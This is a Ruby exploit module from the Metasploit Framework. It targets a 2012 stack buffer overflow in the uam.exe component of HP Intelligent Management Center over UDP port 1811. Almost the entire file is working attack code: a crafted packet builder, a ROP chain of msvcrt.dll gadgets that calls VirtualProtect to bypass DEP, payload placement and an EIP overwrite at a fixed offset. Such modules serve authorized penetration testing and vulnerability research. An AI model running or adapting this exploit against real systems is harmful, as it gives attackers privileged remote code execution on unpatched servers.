# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP Intelligent Management Center UAM Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote buffer overflow in HP Intelligent Management Center
        UAM. The vulnerability exists in the uam.exe component, when using sprint in a
        insecure way for logging purposes. The vulnerability can be triggered by sending a
        malformed packet to the 1811/UDP port. The module has been successfully tested on
        HP iMC 5.0 E0101 and UAM 5.0 E0102 over Windows Server 2003 SP2 (DEP bypass).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;e6af8de8b1d4b2b6d5ba2610cbf9cd38&#039;, # Vulnerability discovery
          &#039;sinn3r&#039;, # Metasploit module
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;85060&#039;],
          [&#039;BID&#039;, &#039;55271&#039;],
          [&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-171&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x0d\x0a",
          &#039;PrependEncoder&#039; => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500
          &#039;Space&#039; => 3925,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => [&#039;win&#039;],
      &#039;Targets&#039;        =>
        [
          [ &#039;HP iMC 5.0 E0101 / UAM 5.0 E0102 on Windows 2003 SP2&#039;,
            {
              &#039;Offset&#039; => 4035,
            }
          ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Aug 29 2012&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([Opt::RPORT(1811)], self.class)
  end

  def junk(n=4)
    return rand_text_alpha(n).unpack("V")[0].to_i
  end

  def nop
    return make_nops(4).unpack("V")[0].to_i
  end

  def send_echo_reply(operator)
    packet = [0xF7103D21].pack("N") # command id
    packet << rand_text(18)
    packet << [0x102].pack("n") # watchdog command type => echo reply
    packet << "AAAA" # ip (static to make offset until EIP static)
    packet << "AA" # port (static to make offset until EIP static)
    packet << operator # Operator max length => 4066, in order to bypass packet length restriction: 4096 total

    connect_udp
    udp_sock.put(packet)
    disconnect_udp
  end


  def exploit

    # ROP chain generated with mona.py - See corelan.be
    rop_gadgets =
      [
        0x77bb2563, # POP EAX # RETN
        0x77ba1114, # <- *&VirtualProtect()
        0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
        junk,
        0x77bb0c86, # XCHG EAX,ESI # RETN
        0x77bc9801, # POP EBP # RETN
        0x77be2265, # ptr to &#039;push esp #  ret&#039;
        0x77bb2563, # POP EAX # RETN
        0x03C0990F,
        0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)
        0x77bb48d3, # POP EBX, RET
        0x77bf21e0, # .data
        0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
        0x77bbfc02, # POP ECX # RETN
        0x77bef001, # W pointer (lpOldProtect) (-> ecx)
        0x77bd8c04, # POP EDI # RETN
        0x77bd8c05, # ROP NOP (-> edi)
        0x77bb2563, # POP EAX # RETN
        0x03c0984f,
        0x77bdd441, # SUB EAX, 03c0940f
        0x77bb8285, # XCHG EAX,EDX # RETN
        0x77bb2563, # POP EAX # RETN
        nop,
        0x77be6591, # PUSHAD # ADD AL,0EF # RETN
      ].pack("V*")

    bof = rand_text(14)
    bof << rop_gadgets
    bof << payload.encoded
    bof << "C" * (target[&#039;Offset&#039;] - 14 - rop_gadgets.length - payload.encoded.length)
    bof << [0x77bb0c86].pack("V") # EIP => XCHG EAX,ESI # RETN # from msvcrt.dll
    bof << [0x77bcc397].pack("V") # ADD EAX,2C # POP EBP # RETN # from msvcrt.dll
    bof << [junk].pack("V") # EBP
    bof << [0x77bcba5e].pack("V") # XCHG EAX,ESP # RETN # from msvcrt.dll

    print_status("Trying target #{target.name}...")
    send_echo_reply(rand_text(20)) # something like... get up! ?
    send_echo_reply(bof) # exploit
  end
end

